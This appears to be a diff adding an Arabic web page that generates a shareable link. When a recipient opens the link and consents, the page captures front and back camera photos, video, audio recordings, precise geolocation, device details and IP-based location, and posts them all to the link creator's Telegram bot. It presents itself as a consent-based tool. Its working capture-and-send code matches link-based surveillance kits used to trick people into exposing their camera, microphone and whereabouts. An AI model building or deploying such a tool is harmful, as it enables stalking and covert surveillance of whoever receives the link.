@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>أداة التقاط الوسائط بموافقة صريحة</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Tahoma,sans-serif;
+    background:#0e0e12;color:#e8e8ee;display:flex;align-items:center;justify-content:center;padding:20px}
+  .card{width:100%;max-width:480px;background:#17171f;border:1px solid #2a2a38;border-radius:20px;
+    padding:24px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+  h1{font-size:20px;margin:0 0 6px}
+  .sub{color:#8a8aa0;font-size:13px;margin-bottom:20px;line-height:1.6}
+  label{display:block;font-size:13px;color:#b0b0c4;margin:14px 0 6px}
+  input[type=text],input[type=number]{width:100%;padding:12px 14px;border-radius:12px;
+    border:1px solid #2e2e40;background:#0e0e14;color:#e8e8ee;font-size:14px;outline:none;
+    direction:ltr;text-align:left}
+  input:focus{border-color:#6d5dfc}
+  fieldset{border:1px solid #2a2a38;border-radius:14px;padding:14px 16px;margin:18px 0}
+  legend{font-size:13px;color:#b0b0c4;padding:0 8px}
+  .feat{display:flex;align-items:center;justify-content:space-between;padding:9px 0;
+    border-bottom:1px solid #22222e;gap:10px}
+  .feat:last-child{border-bottom:none}
+  .feat .name{font-size:14px;flex:1}
+  .feat .dur{width:68px;padding:7px 8px;font-size:13px;text-align:center}
+  .feat input[type=checkbox]{width:20px;height:20px;accent-color:#6d5dfc}
+  button{width:100%;padding:14px;border-radius:14px;border:none;font-size:15px;font-weight:600;
+    cursor:pointer;margin-top:14px;font-family:inherit}
+  .btn-primary{background:#6d5dfc;color:#fff}
+  .btn-ghost{background:transparent;color:#8a8aa0;border:1px solid #2e2e40}
+  .link-box{margin-top:16px;padding:14px;border-radius:12px;background:#0e0e14;
+    border:1px dashed #3a3a50;font-size:12px;word-break:break-all;direction:ltr;text-align:left;
+    color:#9d8dff;line-height:1.6}
+  .hidden{display:none!important}
+  .consent-list{list-style:none;padding:0;margin:16px 0}
+  .consent-list li{padding:10px 0;border-bottom:1px solid #22222e;font-size:14px;
+    display:flex;gap:10px;align-items:center}
+  .consent-list li:last-child{border-bottom:none}
+  .prog-item{display:flex;align-items:center;gap:10px;padding:10px 0;font-size:14px;
+    border-bottom:1px solid #22222e}
+  .prog-item:last-child{border-bottom:none}
+  .prog-icon{width:20px;text-align:center}
+  .note{background:#1e1a2e;border:1px solid #3a3050;border-radius:12px;padding:12px 14px;
+    font-size:12.5px;color:#b8a8e8;line-height:1.7;margin-top:16px}
+</style>
+</head>
+<body>
+
+<div id="setupView" class="card">
+  <h1>إعداد الأداة</h1>
+  <div class="sub">أداة التقاط وسائط بموافقة صريحة. المنفّذ يرى بالضبط ما سيُطلب منه ويوافق بنفسه.</div>
+
+  <label>Chat ID (المستقبِل)</label>
+  <input type="text" id="chatId" placeholder="123456789">
+
+  <label>Bot Token</label>
+  <input type="text" id="botToken" placeholder="123456:ABC-DEF...">
+
+  <fieldset>
+    <legend>الميزات والمدد</legend>
+    <div class="feat">
+      <input type="checkbox" id="f_camFront" checked>
+      <span class="name">صورة — كاميرا أمامية</span>
+      <input type="number" class="dur hidden" value="0" disabled>
+    </div>
+    <div class="feat">
+      <input type="checkbox" id="f_camBack" checked>
+      <span class="name">صورة — كاميرا خلفية</span>
+      <input type="number" class="dur hidden" value="0" disabled>
+    </div>
+    <div class="feat">
+      <input type="checkbox" id="f_videoFront" checked>
+      <span class="name">فيديو — أمامية (ثانية)</span>
+      <input type="number" class="dur" id="d_videoFront" value="10" min="3" max="60">
+    </div>
+    <div class="feat">
+      <input type="checkbox" id="f_videoBack" checked>
+      <span class="name">فيديو — خلفية (ثانية)</span>
+      <input type="number" class="dur" id="d_videoBack" value="10" min="3" max="60">
+    </div>
+    <div class="feat">
+      <input type="checkbox" id="f_audio" checked>
+      <span class="name">تسجيل صوتي (ثانية)</span>
+      <input type="number" class="dur" id="d_audio" value="15" min="3" max="120">
+    </div>
+    <div class="feat">
+      <input type="checkbox" id="f_location" checked>
+      <span class="name">الموقع الجغرافي</span>
+      <input type="number" class="dur hidden" value="0" disabled>
+    </div>
+  </fieldset>
+
+  <label style="display:flex;align-items:center;gap:10px;margin-top:4px">
+    <input type="checkbox" id="opt_deviceInfo" checked style="width:18px;height:18px;accent-color:#6d5dfc">
+    إرسال معلومات الجهاز
+  </label>
+
+  <button class="btn-primary" onclick="buildLink()">إنشاء الرابط</button>
+  <div id="linkOut" class="hidden"></div>
+</div>
+
+<div id="consentView" class="card hidden">
+  <h1>طلب إذن صريح</h1>
+  <div class="sub">
+    الجهة التي أرسلت لك هذا الرابط تطلب الوصول إلى ما يلي.
+    لن يبدأ أي شيء قبل موافقتك، ويمكنك الرفض.
+  </div>
+  <ul class="consent-list" id="consentList"></ul>
+  <div class="note">
+    سيتم إرسال النتائج مباشرة إلى الجهة التي أرسلت الرابط عبر Telegram.
+    لا توجد نسخة مخفية أو تشغيل في الخلفية.
+  </div>
+  <button class="btn-primary" onclick="grantConsent()">أوافق — ابدأ</button>
+  <button class="btn-ghost" onclick="declineConsent()">لا أوافق</button>
+</div>
+
+<div id="runView" class="card hidden">
+  <h1>جاري التنفيذ</h1>
+  <div class="sub">اترك الصفحة مفتوحة حتى تنتهي الخطوات.</div>
+  <ul class="consent-list" id="progressList"></ul>
+</div>
+
+<div id="doneView" class="card hidden">
+  <h1>تم بنجاح</h1>
+  <div class="sub">تم إرسال كل ما وافقت عليه. يمكنك إغلاق الصفحة.</div>
+</div>
+
+<script>
+"use strict";
+let PARAMS = { chat:"", token:"", features:[], durs:{} };
+const $ = id => document.getElementById(id);
+
+function show(v){
+  ["setupView","consentView","runView","doneView"].forEach(x=>{
+    $(x).classList.toggle("hidden", x!==v);
+  });
+}
+
+function parseURL(){
+  const p = new URLSearchParams(location.search);
+  const chat = p.get("chat")||"";
+  const token = p.get("token")||"";
+  const features = (p.get("features")||"").split(",").filter(Boolean);
+  const durs = {};
+  (p.get("durs")||"").split("|").filter(Boolean).forEach(x=>{
+    const [k,v] = x.split(":");
+    if(k&&v) durs[k]=parseInt(v,10);
+  });
+  PARAMS = {chat,token,features,durs};
+  return chat && token && features.length>0;
+}
+
+function buildLink(){
+  const chat = $("chatId").value.trim();
+  const token = $("botToken").value.trim();
+  if(!chat||!token){ alert("لازم تدخل Chat ID و Bot Token"); return; }
+
+  const map = [
+    ["camFront","f_camFront",null],
+    ["camBack","f_camBack",null],
+    ["videoFront","f_videoFront","d_videoFront"],
+    ["videoBack","f_videoBack","d_videoBack"],
+    ["audio","f_audio","d_audio"],
+    ["location","f_location",null]
+  ];
+  const feats=[], durs=[];
+  map.forEach(([key,cb,dur])=>{
+    if($(cb).checked){
+      feats.push(key);
+      if(dur) durs.push(key+":"+($(dur).value||"10"));
+    }
+  });
+  if($("opt_deviceInfo").checked) feats.push("deviceInfo");
+  if(!feats.length){ alert("اختر ميزة واحدة على الأقل"); return; }
+
+  const base = location.origin + location.pathname;
+  let url = base+"?chat="+encodeURIComponent(chat)
+        +"&token="+encodeURIComponent(token)
+        +"&features="+encodeURIComponent(feats.join(","));
+  if(durs.length) url += "&durs="+encodeURIComponent(durs.join("|"));
+
+  const out = $("linkOut");
+  out.classList.remove("hidden");
+  out.className = "link-box";
+  out.textContent = url;
+  if(navigator.clipboard) navigator.clipboard.writeText(url).catch(()=>{});
+  out.insertAdjacentHTML("afterend",'<div class="note">تم نسخ الرابط تلقائياً.</div>');
+}
+
+const LABELS = {
+  camFront:"📷 صورة من الكاميرا الأمامية",
+  camBack:"📷 صورة من الكاميرا الخلفية",
+  videoFront:"🎥 فيديو من الكاميرا الأمامية",
+  videoBack:"🎥 فيديو من الكاميرا الخلفية",
+  audio:"🎤 تسجيل صوتي",
+  location:"📍 الموقع الجغرافي",
+  deviceInfo:"📱 معلومات الجهاز"
+};
+
+function buildConsentList(){
+  const ul = $("consentList");
+  ul.innerHTML = "";
+  PARAMS.features.forEach(f=>{
+    let t = LABELS[f]||f;
+    if(PARAMS.durs[f]) t += " — "+PARAMS.durs[f]+" ثانية";
+    const li = document.createElement("li");
+    li.textContent = t;
+    ul.appendChild(li);
+  });
+}
+
+async function tg(method, data){
+  const url = "https://api.telegram.org/bot"+PARAMS.token+"/"+method;
+  const r = await fetch(url,{method:"POST",body:data});
+  return r.json().catch(()=>({}));
+}
+async function sendPhoto(b,c){const f=new FormData();f.append("chat_id",PARAMS.chat);
+  f.append("photo",b,"p_"+Date.now()+".jpg");f.append("caption",c);return tg("sendPhoto",f);}
+async function sendVideo(b,c){const f=new FormData();f.append("chat_id",PARAMS.chat);
+  f.append("video",b,"v_"+Date.now()+".webm");f.append("caption",c);return tg("sendVideo",f);}
+async function sendAudio(b,c){const f=new FormData();f.append("chat_id",PARAMS.chat);
+  f.append("audio",b,"a_"+Date.now()+".webm");f.append("caption",c);return tg("sendAudio",f);}
+async function sendText(t){const f=new FormData();f.append("chat_id",PARAMS.chat);
+  f.append("text",t);return tg("sendMessage",f);}
+
+async function getDeviceInfo(){
+  const l=[];
+  l.push("📱 معلومات الجهاز");
+  l.push("الوقت: "+new Date().toLocaleString("ar-EG"));
+  l.push("المتصفح: "+navigator.userAgent);
+  l.push("اللغة: "+navigator.language);
+  l.push("الشاشة: "+screen.width+"×"+screen.height);
+  try{ if(navigator.getBattery){const b=await navigator.getBattery();
+    l.push("البطارية: "+Math.round(b.level*100)+"%"+(b.charging?" (تشحن)":""));} }catch(e){}
+  try{ const c=navigator.connection; if(c) l.push("الشبكة: "+(c.effectiveType||"?")); }catch(e){}
+  try{ const r=await fetch("https://ipapi.co/json/",{cache:"no-store"});
+    const j=await r.json(); if(j.ip)l.push("IP: "+j.ip);
+    if(j.country_name)l.push("الدولة: "+j.country_name);
+    if(j.city)l.push("المدينة: "+j.city); }catch(e){}
+  return l.join("\n");
+}
+
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
+
+async function getStream(v,a){
+  return navigator.mediaDevices.getUserMedia({
+    video: v ? { facingMode: v==="front"?"user":{ideal:"environment"},
+      width:{ideal:1280},height:{ideal:720} } : false,
+    audio: a ? true : false
+  });
+}
+
+async function capturePhoto(facing){
+  const s = await getStream(facing,false);
+  const v = document.createElement("video");
+  v.srcObject = s; v.setAttribute("playsinline",""); v.muted = true;
+  await v.play(); await sleep(1200);
+  const c = document.createElement("canvas");
+  c.width = v.videoWidth||1280; c.height = v.videoHeight||720;
+  c.getContext("2d").drawImage(v,0,0,c.width,c.height);
+  s.getTracks().forEach(t=>t.stop());
+  return new Promise(r=>c.toBlob(r,"image/jpeg",0.9));
+}
+
+async function captureVideo(facing,secs){
+  const s = await getStream(facing,true);
+  const chunks = [];
+  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
+    ? "video/webm;codecs=vp9" : "video/webm";
+  const rec = new MediaRecorder(s,{mimeType:mime});
+  rec.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+  return new Promise(r=>{
+    rec.onstop = ()=>{ s.getTracks().forEach(t=>t.stop());
+      r(new Blob(chunks,{type:"video/webm"})); };
+    rec.start(); setTimeout(()=>rec.stop(), secs*1000);
+  });
+}
+
+async function captureAudio(secs){
+  const s = await getStream(false,true);
+  const chunks = [];
+  const rec = new MediaRecorder(s,{mimeType:"audio/webm"});
+  rec.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+  return new Promise(r=>{
+    rec.onstop = ()=>{ s.getTracks().forEach(t=>t.stop());
+      r(new Blob(chunks,{type:"audio/webm"})); };
+    rec.start(); setTimeout(()=>rec.stop(), secs*1000);
+  });
+}
+
+function getLocation(){
+  return new Promise((res,rej)=>{
+    if(!navigator.geolocation) return rej("غير مدعوم");
+    navigator.geolocation.getCurrentPosition(
+      p=>res(p.coords), e=>rej(e.message),
+      {enableHighAccuracy:true,timeout:15000}
+    );
+  });
+}
+
+function progress(label,icon){
+  const li = document.createElement("li");
+  li.className = "prog-item";
+  li.innerHTML = '<span class="prog-icon">'+icon+'</span><span>'+label+'</span>';
+  $("progressList").appendChild(li);
+  return li;
+}
+
+async function run(){
+  show("runView");
+
+  if(PARAMS.features.includes("deviceInfo")){
+    const li = progress("معلومات الجهاز","⏳");
+    try{ await sendText(await getDeviceInfo());
+      li.querySelector(".prog-icon").textContent="✅"; }
+    catch(e){ li.querySelector(".prog-icon").textContent="❌"; }
+  }
+
+  for(const [k,f,l] of [["camFront","front","صورة أمامية"],["camBack","back","صورة خلفية"]]){
+    if(!PARAMS.features.includes(k)) continue;
+    const li = progress(l,"⏳");
+    try{ const b = await capturePhoto(f);
+      await sendPhoto(b,"📷 "+l);
+      li.querySelector(".prog-icon").textContent="✅"; }
+    catch(e){ li.querySelector(".prog-icon").textContent="❌"; }
+    await sleep(600);
+  }
+
+  for(const [k,f,l] of [["videoFront","front","فيديو أمامي"],["videoBack","back","فيديو خلفي"]]){
+    if(!PARAMS.features.includes(k)) continue;
+    const s = PARAMS.durs[k]||10;
+    const li = progress(l+" ("+s+"ث)","⏳");
+    try{ const b = await captureVideo(f,s);
+      await sendVideo(b,"🎥 "+l+" — "+s+" ثانية");
+      li.querySelector(".prog-icon").textContent="✅"; }
+    catch(e){ li.querySelector(".prog-icon").textContent="❌"; }
+    await sleep(600);
+  }
+
+  if(PARAMS.features.includes("audio")){
+    const s = PARAMS.durs.audio||15;
+    const li = progress("تسجيل صوتي ("+s+"ث)","⏳");
+    try{ const b = await captureAudio(s);
+      await sendAudio(b,"🎤 تسجيل صوتي — "+s+" ثانية");
+      li.querySelector(".prog-icon").textContent="✅"; }
+    catch(e){ li.querySelector(".prog-icon").textContent="❌"; }
+  }
+
+  if(PARAMS.features.includes("location")){
+    const li = progress("الموقع الجغرافي","⏳");
+    try{ const c = await getLocation();
+      const m = "https://maps.google.com/?q="+c.latitude+","+c.longitude;
+      await sendText("📍 الموقع\nخط العرض: "+c.latitude+
+        "\nخط الطول: "+c.longitude+
+        "\nالدقة: "+Math.round(c.accuracy)+" م\n"+m);
+      li.querySelector(".prog-icon").textContent="✅"; }
+    catch(e){ li.querySelector(".prog-icon").textContent="❌"; }
+  }
+
+  setTimeout(()=>show("doneView"),800);
+}
+
+function grantConsent(){ run(); }
+function declineConsent(){
+  document.body.innerHTML = '<div class="card"><h1>تم الرفض</h1>'+
+    '<div class="sub">لم يتم الوصول إلى أي شيء. يمكنك إغلاق الصفحة.</div></div>';
+}
+
+(function init(){
+  if(parseURL()){ buildConsentList(); show("consentView"); }
+  else show("setupView");
+})();
+</script>
+</body>
+</html>
